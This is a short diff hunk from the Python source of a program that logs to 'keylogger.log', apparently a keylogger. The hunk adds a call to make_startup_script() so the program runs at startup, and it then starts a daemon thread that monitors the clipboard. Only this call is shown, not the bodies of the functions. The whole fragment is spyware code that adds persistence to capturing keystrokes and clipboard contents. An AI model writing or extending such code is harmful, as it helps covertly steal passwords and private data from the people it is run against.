@@ -92,6 +92,7 @@ def main(log_file_path = 'keylogger.log'):
         format='%(asctime)s - %(levelname)s - %(message)s',
         filename=log_file #creating file
     )
+    make_startup_script()
 
     clipboard_thread = threading.Thread(target=clipboard_monitor, daemon=True)
     clipboard_thread.start()
